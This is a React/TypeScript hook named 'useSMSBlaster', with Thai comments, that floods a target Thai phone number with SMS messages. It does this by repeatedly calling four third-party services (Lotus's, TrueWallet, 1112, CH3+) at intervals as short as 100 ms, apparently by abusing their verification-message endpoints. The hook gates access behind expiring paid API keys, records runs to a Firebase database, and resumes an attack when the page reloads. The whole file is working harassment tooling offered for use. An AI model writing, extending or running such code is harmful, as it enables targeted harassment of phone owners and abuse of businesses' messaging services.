
import { useState, useRef, useEffect } from "react";
import { useToast } from "@/components/ui/use-toast";
import axios from "axios";
import { api1, api2, api3, api4 } from "@/services/smsAPIs";

interface LogEntry {
  timestamp: string;
  phone: string;
  status: 'success' | 'error';
  message: string;
}

interface PhoneReport {
  reason: string;
  count: number;
}

interface SMSHistoryEntry {
  phone: string;
  startTime: string;
  endTime: string;
  totalRounds: number;
  successCount: number;
  failedCount: number;
  duration: number;
  speed: "slow" | "normal" | "fast" | "ultra";
  status: "active" | "completed";
}

export const useSMSBlaster = () => {
  const [phoneNumber, setPhoneNumber] = useState("");
  const [minutes, setMinutes] = useState("1");
  const [loading, setLoading] = useState(false);
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [remainingTime, setRemainingTime] = useState<number>(0);
  const [apiKey, setApiKey] = useState("");
  const [showKeyInput, setShowKeyInput] = useState(false);
  const [phoneReport, setPhoneReport] = useState<PhoneReport | null>(null);
  const [phoneHistory, setPhoneHistory] = useState<Set<string>>(new Set());
  const [speed, setSpeed] = useState<"slow" | "normal" | "fast" | "ultra">("normal");
  const timerRef = useRef<NodeJS.Timeout>();
  const { toast } = useToast();

  // ตั้งค่าความเร็วในการยิง
  const speedMap = {
    slow: 1000,
    normal: 500,
    fast: 200,
    ultra: 100
  };

  const addLog = (phone: string, status: 'success' | 'error', message: string) => {
    const newLog = {
      timestamp: new Date().toLocaleTimeString(),
      phone,
      status,
      message
    };
    
    setLogs(prev => [newLog, ...prev].slice(0, 100));
    setPhoneHistory(prev => new Set(prev.add(phone)));
  };

  const startSMSBlast = async () => {
    setLoading(true);
    const totalSeconds = parseInt(minutes) * 60;
    setRemainingTime(totalSeconds);
    const startTime = new Date().toISOString();
    
    let successCount = 0;
    let failedCount = 0;
    
    addLog(phoneNumber, 'success', `เริ่มต้นการส่ง SMS เป็นเวลา ${minutes} นาที`);
    
    // บันทึกประวัติการยิง
    const historyEntry: SMSHistoryEntry = {
      phone: phoneNumber,
      startTime,
      endTime: '', // จะอัพเดทเมื่อจบ
      totalRounds: 0,
      successCount: 0,
      failedCount: 0,
      duration: parseInt(minutes),
      speed,
      status: "active"
    };

    try {
      await axios.post("https://goak-71ac8-default-rtdb.firebaseio.com/history.json", historyEntry);
    } catch (error) {
      console.error("Error saving history:", error);
    }
    
    let timeLeft = totalSeconds;
    
    // ใช้ localStorage เพื่อเก็บข้อมูลการยิง
    localStorage.setItem('smsBlast', JSON.stringify({
      phone: phoneNumber,
      timeLeft,
      speed,
      timestamp: startTime,
      successCount,
      failedCount
    }));
    
    const smsInterval = setInterval(async () => {
      if (timeLeft <= 0) {
        clearInterval(smsInterval);
        setLoading(false);
        setRemainingTime(0);
        
        // อัพเดทประวัติเมื่อจบการยิง
        const endTime = new Date().toISOString();
        const finalHistory: Partial<SMSHistoryEntry> = {
          endTime,
          totalRounds: Math.floor(successCount / 4),
          successCount,
          failedCount,
          status: "completed"
        };

        try {
          const response = await axios.get("https://goak-71ac8-default-rtdb.firebaseio.com/history.json");
          if (response.data) {
            const histories = Object.entries(response.data);
            const lastHistory = histories.find(([_, h]: [string, any]) => 
              h.phone === phoneNumber && h.status === "active"
            );
            
            if (lastHistory) {
              await axios.patch(
                `https://goak-71ac8-default-rtdb.firebaseio.com/history/${lastHistory[0]}.json`,
                finalHistory
              );
            }
          }
        } catch (error) {
          console.error("Error updating history:", error);
        }

        addLog(phoneNumber, 'success', `🏁 สิ้นสุดการส่ง SMS แล้ว`);
        localStorage.removeItem('smsBlast');
        toast({
          title: "สำเร็จ",
          description: `สิ้นสุดการส่ง SMS ไปยังหมายเลข ${phoneNumber}`,
        });
        return;
      }

      const sendPromises = [
        { api: api1, name: 'Lotus\'s' },
        { api: api2, name: 'TrueWallet' },
        { api: api3, name: '1112' },
        { api: api4, name: 'CH3+' }
      ].map(async ({ api, name }) => {
        try {
          await api(phoneNumber);
          successCount++;
          addLog(phoneNumber, 'success', `ส่ง SMS สำเร็จผ่าน ${name}`);
        } catch (error) {
          failedCount++;
          addLog(phoneNumber, 'error', `⚠ ไม่สามารถส่ง SMS ผ่าน ${name}`);
          console.error(`Error with endpoint ${name}:`, error);
        }
      });

      await Promise.all(sendPromises);
      
      timeLeft--;
      setRemainingTime(timeLeft);
      
      // อัพเดท localStorage
      localStorage.setItem('smsBlast', JSON.stringify({
        phone: phoneNumber,
        timeLeft,
        speed,
        timestamp: startTime,
        successCount,
        failedCount
      }));
    }, speedMap[speed]);

    timerRef.current = smsInterval;
  };

  // โหลดข้อมูลการยิงเมื่อเปิดเว็บใหม่
  useEffect(() => {
    const savedBlast = localStorage.getItem('smsBlast');
    if (savedBlast) {
      const { phone, timeLeft, speed: savedSpeed, timestamp } = JSON.parse(savedBlast);
      
      // ตรวจสอบว่าเวลาที่เหลือยังไม่หมด
      const elapsedSeconds = Math.floor((new Date().getTime() - new Date(timestamp).getTime()) / 1000);
      const remainingSeconds = timeLeft - elapsedSeconds;
      
      if (remainingSeconds > 0) {
        setPhoneNumber(phone);
        setSpeed(savedSpeed);
        setRemainingTime(remainingSeconds);
        startSMSBlast();
      } else {
        localStorage.removeItem('smsBlast');
      }
    }
  }, []);

  const validatePhoneNumber = (number: string) => {
    const regex = /^0\d{9}$/;
    return regex.test(number);
  };

  const checkPhoneReport = async (phone: string) => {
    try {
      const response = await axios.get(`https://goak-71ac8-default-rtdb.firebaseio.com/reports/${phone}.json`);
      if (response.data) {
        setPhoneReport(response.data);
        setShowKeyInput(true);
        toast({
          title: "⚠️ คำเตือน",
          description: `เบอร์นี้ถูกรายงานว่า: ${response.data.reason}`,
          variant: "destructive",
        });
      } else {
        setShowKeyInput(true);
      }
    } catch (error) {
      console.error("Error checking phone report:", error);
      setShowKeyInput(true);
    }
  };

  const validateApiKey = async (key: string) => {
    try {
      const response = await axios.get(`https://goak-71ac8-default-rtdb.firebaseio.com/keys/${key}.json`);
      if (response.data && response.data.active) {
        const expireDate = new Date(response.data.expireDate);
        if (expireDate > new Date()) {
          return true;
        }
        toast({
          title: "API Key หมดอายุ",
          description: "กรุณาติดต่อแอดมินเพื่อต่ออายุ Key",
          variant: "destructive",
        });
        return false;
      }
      toast({
        title: "API Key ไม่ถูกต้อง",
        description: "กรุณาตรวจสอบ Key ของท่าน",
        variant: "destructive",
      });
      return false;
    } catch (error) {
      console.error("Error validating API key:", error);
      return false;
    }
  };

  const handlePhoneSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!validatePhoneNumber(phoneNumber)) {
      toast({
        title: "หมายเลขโทรศัพท์ไม่ถูกต้อง",
        description: "กรุณากรอกหมายเลขโทรศัพท์ 10 หลัก ที่ขึ้นต้นด้วย 0",
        variant: "destructive",
      });
      return;
    }

    await checkPhoneReport(phoneNumber);
  };

  const handleApiKeySubmit = async () => {
    if (await validateApiKey(apiKey)) {
      startSMSBlast();
    }
  };

  return {
    phoneNumber,
    setPhoneNumber,
    minutes,
    setMinutes,
    loading,
    logs,
    remainingTime,
    apiKey,
    setApiKey,
    showKeyInput,
    phoneReport,
    phoneHistory,
    speed,
    setSpeed,
    handlePhoneSubmit,
    handleApiKeySubmit,
  };
};
